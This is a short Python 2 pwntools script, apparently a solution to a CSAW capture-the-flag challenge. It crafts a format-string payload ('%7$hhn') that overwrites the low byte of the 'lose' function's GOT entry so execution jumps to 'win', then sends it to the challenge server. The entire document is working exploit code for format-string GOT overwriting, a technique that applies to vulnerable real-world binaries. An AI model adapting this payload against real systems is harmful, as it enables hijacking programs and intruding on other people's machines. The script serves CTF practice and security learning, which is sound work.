#!/usr/bin/env python2

from pwn import *

lose     = 0xf7fc91f8
win      = 0xf7fc9189
lose_got = 0x0804a010

# mov byte [lose_got],  0x89

fmt = p32(lose_got)
fmt_length = 4

next_run = 0x89 - fmt_length
fmt += r'%1${}c%7$hhn'.format(next_run)
fmt_length += next_run

fmt += r'\n\n'
fmt_length += 2

r = remote('pwn.chal.csaw.io', 1004)
r.sendline(fmt)
r.stream()
